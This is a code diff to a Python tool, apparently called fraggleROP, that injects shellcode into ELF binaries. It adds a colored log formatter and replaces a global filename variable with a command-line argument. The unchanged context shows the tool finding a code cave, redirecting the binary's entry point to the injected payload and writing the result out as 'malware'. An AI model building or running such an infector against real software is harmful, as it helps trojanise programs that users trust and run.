@@ -12,12 +12,52 @@ from elf import Elf64_Phdr
 from elf import Elf32_Ehdr
 from elf import Elf32_Phdr
 
+COLORS = {"yellow" : "\033[33;1m",
+          "red"    : "\033[31;1m",
+          "reset"  : "\033[0m"}
+
+class CustomLogFormatter(logging.Formatter):
+    '''Establish a custom display format for the various
+       log levels used within the program.'''
+
+    err_format  = "[{}!{}] ERROR: %(msg)s".format(COLORS["red"],COLORS["reset"])
+    dbg_format  = "[{}DEBUG{}] %(msg)s".format(COLORS["red"],COLORS["reset"])
+    info_format = "[{}*{}] %(msg)s".format(COLORS["yellow"],COLORS["reset"])
+
+    def __init__(self):
+        super().__init__(fmt="%(levelno)d: %(msg)s", datefmt=None, style="%")
+
+    def format(self, record):
+
+        # save the original format configured by the user
+        # when the logger formatter was instantiated
+        format_orig = self._style._fmt
+
+        # Replace the original format with the customized version
+        if record.levelno == logging.DEBUG:
+            self._style._fmt = CustomLogFormatter.dbg_format
+
+        elif record.levelno == logging.INFO:
+            self._style._fmt = CustomLogFormatter.info_format
+
+        elif record.levelno ==  logging.ERROR:
+            self._style._fmt = CustomLogFormatter.err_format
+
+        # Call the original formatter class to do the grunt work
+        result = logging.Formatter.format(self, record)
+
+        # Restore the original format
+        self._style._fmt = format_orig
+
+        return result
 
 def logger_setup(level):
     '''setup logging for display'''
     logger = logging.getLogger('fraggleROP')
+    fmt    = CustomLogFormatter()
     # setup stream handler to stderr output
     ch = logging.StreamHandler()
+    ch.setFormatter(fmt)
    
     # Verbose output if DEBUG is passed else normal
     if level == "DEBUG":
@@ -155,8 +195,6 @@ def locate_codecave(load_sections,payload_sz):
 
 def inject_shellcode(elf,txt_segment,payload,args):
 
-    global target_file
-
     # calculate location to inject payload
     mem_align = txt_segment.p_filesz + (16 - (txt_segment.p_filesz & 0xf))
     cave_offset = txt_segment.p_offset + mem_align
@@ -171,7 +209,7 @@ def inject_shellcode(elf,txt_segment,payload,args):
     logger.debug("New payload size is: %d" % len(shellcode))
 
     # read in the target binary in order to inject payload into
-    with open(target_file,'rb') as f:
+    with open(args.file,'rb') as f:
         data = f.read()
 
     # change the binary entry point to hold the address of the injected shellcode
@@ -191,7 +229,7 @@ def inject_shellcode(elf,txt_segment,payload,args):
         with open("malware","wb") as f:
             f.write(data)
     
-        logger.info("Shellcode successfully injected into: %s" % target_file)
+        logger.info("Shellcode successfully injected into: %s" % args.file)
         
 
 def shellcode(payload):
@@ -252,12 +290,9 @@ def args():
 
 if __name__ == '__main__':
     
-    global target_file
     global logger
 
     args = args()
-
-    target_file = args.file
 
     # determine loggerging level based on arguments
     if args.verbose:
